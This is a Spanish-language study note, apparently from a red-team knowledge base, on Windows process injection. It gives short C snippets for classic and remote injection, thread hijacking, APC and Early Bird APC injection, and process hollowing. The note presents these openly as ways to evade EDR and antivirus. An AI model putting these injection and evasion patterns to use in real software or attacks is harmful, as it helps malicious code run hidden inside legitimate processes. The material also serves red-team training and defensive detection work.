---
title: Process Injection — Técnicas
tags: [opsec, process-injection, shellcode, thread-hijacking, apc, process-hollowing]
---

# Process Injection — Técnicas

La inyección de procesos introduce código malicioso en un espacio de memoria de un proceso legítimo, bypaseando el EDR y heredando su security context.

## Pasos fundamentales

1. Asignar región de memoria en el proceso
2. Copiar la shellcode
3. Ejecutar la shellcode (típicamente via un thread)

## Classic Injection (proceso actual)

```c
auto hMemory = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(GetCurrentProcess(), hMemory, &shellcode, sizeof(shellcode), &bytesWritten);
auto hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)hMemory, NULL, 0, &threadId);
WaitForSingleObject(hThread, INFINITE);
```

## Classic Remote Injection (proceso externo)

```c
auto hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
auto hMemory = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProcess, hMemory, &shellcode, sizeof(shellcode), &bytesWritten);
auto hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)hMemory, NULL, 0, &threadId);
```

## Thread Hijacking

En lugar de crear un nuevo thread (ruidoso), se secuestra uno existente:

```c
// Crear thread suspendido apuntando a función legítima
auto hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&dummy, NULL, CREATE_SUSPENDED, &threadId);
Sleep(5 * 1000); // esperar a que AV pase
// Redirigir el contexto del thread a la shellcode
GetThreadContext(hThread, &ctx);
ctx.Rip = (DWORD64)hMemory;
SetThreadContext(hThread, &ctx);
ResumeThread(hThread);
```

## APC Injection (Asynchronous Procedure Calls)

Encolar una APC en un thread existente. El thread la ejecutará en su próximo "alertable wait state".

```c
QueueUserAPC((PAPCFUNC)hMemory, hThread, 0);
```

## Early Bird APC

Crear el proceso en estado suspendido, encolar la APC antes de que arranque:

```c
CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE,
    CREATE_SUSPENDED, NULL, L"C:\\Windows\\System32", &si, &pi);
// Asignar + copiar shellcode en pi.hProcess
QueueUserAPC((PAPCFUNC)hMemory, pi.hThread, 0);
ResumeThread(pi.hThread);
```

## Process Hollowing

Crear proceso suspendido, sobrescribir su Entry Point con la shellcode:

```c
CreateProcess(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL,
    FALSE, CREATE_SUSPENDED, NULL, L"C:\\Windows\\System32", &si, &pi);
// Leer PEB → base address → NT headers → Entry Point
// WriteProcessMemory al entry point con shellcode
ResumeThread(pi.hThread);
```

## Ver también
- [[Malware Essentials]]
- [[Funcionamiento de EDR]]
- [[PPID Spoofing]]
- [[Fork & Run vs BOF]]
